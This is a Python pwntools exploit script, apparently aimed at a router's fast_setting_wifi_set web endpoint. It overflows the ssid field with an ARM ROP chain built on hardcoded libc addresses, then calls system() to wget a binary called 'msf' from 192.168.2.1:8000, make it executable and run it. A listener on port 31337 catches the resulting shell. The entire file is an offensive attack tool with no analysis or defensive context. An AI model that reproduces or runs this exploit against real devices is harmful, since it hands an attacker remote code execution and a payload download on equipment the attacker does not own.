#!/usr/bin/python3

import requests
from pwn import *
from threading import Thread

cmd  = b'wget http://192.168.2.1:8000/tools/msf -O /msf\n'
cmd += b'chmod 777 /msf\n'
cmd += b'/msf'

assert(len(cmd) < 255)

libc_base = 0x76d19000

system = libc_base + 0x5A270
readable_addr = libc_base + 0x64144
mov_r0_ret_r3 = libc_base + 0x40cb8
pop_r3 = libc_base + 0x18298

payload  = b'a'*(0x60) + p32(readable_addr) + b'b'*(0x20-8)
payload += p32(pop_r3) + p32(system) + p32(mov_r0_ret_r3) + cmd

url = "http://192.168.2.2:80/goform/fast_setting_wifi_set"
cookie = {"Cookie": "password=12345"}
data = {"ssid": payload}

def attack():
    try:
        requests.post(url, cookies=cookie, data=data)
        requests.post(url, cookies=cookie, data=data)
    except Exception as e:
        print(e)

thread = Thread(target=attack)
thread.start()

io = listen(31337)
io.wait_for_connection()
log.success("getshell")
io.interactive()

thread.join()
